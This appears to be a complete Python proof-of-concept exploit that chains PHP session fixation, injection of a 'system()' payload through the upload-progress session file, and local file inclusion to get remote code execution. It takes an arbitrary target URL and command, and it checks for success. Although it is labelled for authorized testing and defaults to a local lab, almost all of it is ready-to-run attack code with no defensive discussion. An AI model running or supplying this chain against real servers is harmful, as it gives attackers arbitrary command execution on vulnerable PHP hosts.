#!/usr/bin/env python3
# /// script
# requires-python = ">=3.9"
# dependencies = []
# ///
"""Chain A — session file injection + LFI -> RCE (PHP session.upload_progress).

Runs entirely at the SAPI layer (rfc1867 multipart handler) before any
application code, on every POST endpoint, when session.upload_progress is on
(PHP default since 5.4).

Run with uv (no dependencies, stdlib only):
  uv run poc_chain_a.py
  uv run poc_chain_a.py --target http://127.0.0.1:18081
  uv run poc_chain_a.py --target https://victim.example --save-path /var/lib/php/sessions
  uv run poc_chain_a.py --docker p2s2-lab      # adds raw session-file proof

For authorized testing only.
"""
import argparse
import os
import re
import socket
import ssl
import sys
from urllib.parse import urlparse

B = "POCBOUNDARYA"


def send(host, port, method, path, body=None, headers="", scheme="http"):
    data = b"" if body is None else body
    hdr = (f"{method} {path} HTTP/1.1\r\nHost: {host}\r\n"
           f"Content-Length: {len(data)}\r\nConnection: close\r\n{headers}\r\n").encode()
    sock = socket.create_connection((host, port), timeout=15)
    if scheme == "https":
        sock = ssl.create_default_context().wrap_socket(sock, server_hostname=host)
    sock.sendall(hdr + data)
    sock.settimeout(10)
    resp = b""
    while True:
        try:
            d = sock.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    sock.close()
    return resp


def multipart_upload(host, port, path, sid, filename, scheme="http"):
    body = (
        f"--{B}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
        f"--{B}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        f"--{B}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{filename}"\r\n\r\n'
        f"Z\r\n"
        f"--{B}--\r\n"
    ).encode("latin-1")
    return send(host, port, "POST", path, body,
                f"Content-Type: multipart/form-data; boundary={B}\r\n", scheme)


def body_of(resp):
    return resp.partition(b"\r\n\r\n")[2]


def docker(cmd):
    import subprocess
    return subprocess.run(["docker", "exec", cmd[0], "bash", "-c", cmd[1]],
                          capture_output=True, text=True).stdout.strip()


def main():
    ap = argparse.ArgumentParser(description="Chain A: session injection + LFI -> RCE")
    ap.add_argument("--target", default="http://127.0.0.1:18081")
    ap.add_argument("--write-path", default="/chainA/index.php", help="any POST endpoint with a session")
    ap.add_argument("--lfi-path", default="/chainA/lfi.php", help="LFI endpoint: include($_GET['page'])")
    ap.add_argument("--lfi-param", default="page")
    ap.add_argument("--save-path", default="/tmp/sess", help="session.save_path of the target")
    ap.add_argument("--cmd", default="id", help="command for the injected payload")
    ap.add_argument("--docker", metavar="CONTAINER", help="container name for raw file proof")
    ap.add_argument("--sid", help="session id to fixate (default: random)")
    args = ap.parse_args()

    u = urlparse(args.target)
    scheme = u.scheme or "http"
    host, port = u.hostname, u.port or (443 if scheme == "https" else 80)
    sid = args.sid or ("chaina" + os.urandom(12).hex())
    sess_file = f"{args.save_path}/sess_{sid}"
    marker = "RCE-A-OK"

    print(f"[*] Chain A — session file injection + LFI -> RCE")
    print(f"[*] target={scheme}://{host}:{port}  sid={sid}  cmd={args.cmd!r}\n")

    # [1] Fixation + injection: SID comes from the POST BODY. No cookie header at all.
    payload = f"<?php system('{args.cmd}');echo '{marker}';?>"
    print(f"[1] uploading multipart POST (PHPSESSID in body only, no cookie)")
    print(f"    payload filename: {payload}")
    r = multipart_upload(host, port, args.write_path, sid, payload, scheme)
    status = r.split(b"\r\n", 1)[0].decode("latin-1", "replace")
    print(f"    -> {status}")
    if not status.startswith("HTTP/1.1 200"):
        print("[-] upload request failed"); sys.exit(1)

    # [2] show the raw session file (needs docker access to the target)
    if args.docker:
        raw = docker((args.docker, f"cat {sess_file}"))
        print(f"\n[2] raw session file {sess_file}:")
        print(f"    {raw}")
        if payload in raw:
            print("    [+] FIXATION + INJECTION CONFIRMED: attacker SID file exists, PHP stored raw")
        else:
            print("    [~] file content not shown/empty (different save_path?)")

    # [3] RCE via LFI
    print(f"\n[3] triggering LFI: GET {args.lfi_path}?{args.lfi_param}={sess_file}")
    r = send(host, port, "GET", f"{args.lfi_path}?{args.lfi_param}={sess_file}", scheme=scheme)
    out = body_of(r).decode("latin-1", "replace")

    uid = re.search(r"uid=\d+\([a-z-]+\)[^\r\n]*", out)
    if marker in out:
        print(f"    [+] RCE CONFIRMED — injected code executed, marker {marker!r} present")
        if uid:
            print(f"    [+] command output: {uid.group(0)}")
        sys.exit(0)
    print(f"[-] marker not found. Raw response body:\n{out[:500]}")
    sys.exit(1)


if __name__ == "__main__":
    main()
